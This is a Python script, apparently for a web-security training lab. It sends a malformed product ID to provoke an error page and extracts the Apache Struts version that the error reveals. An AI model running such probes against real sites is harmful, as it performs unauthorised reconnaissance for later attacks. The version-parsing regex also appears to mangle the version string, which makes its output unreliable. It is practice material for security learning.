import requests
import re

# 🔧 CONFIG
LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net/product?productId="
PAYLOAD = '"injection"'

# 🧠 HEADERS (Optionally add your session cookie if needed)
headers = {
    "User-Agent": "Mozilla/5.0",
    # "Cookie": "session=YOUR_SESSION_HERE"
}

# 🚀 MAKE THE REQUEST
def extract_version():
    try:
        print(f"[+] Sending request to: {LAB_URL}{PAYLOAD}")
        response = requests.get(LAB_URL + PAYLOAD, headers=headers, timeout=10)

        if response.status_code == 200:
            # 🧙 Regex magic to find Apache Struts version
            match = re.search(r'Apache Struts 2(?:\.| )([0-9]+\.[0-9]+\.[0-9]+)', response.text)
            if match:
                version = "2." + match.group(1)
                print(f"[🎯] Apache Struts version disclosed: {version}")
                return version
            else:
                print("[-] No version info found. Maybe lab is patched or wrong URL.")
        else:
            print(f"[-] Unexpected response code: {response.status_code}")

    except Exception as e:
        print(f"[!] Exception occurred: {e}")

# 🔍 Run the extractor
if __name__ == "__main__":
    extract_version()
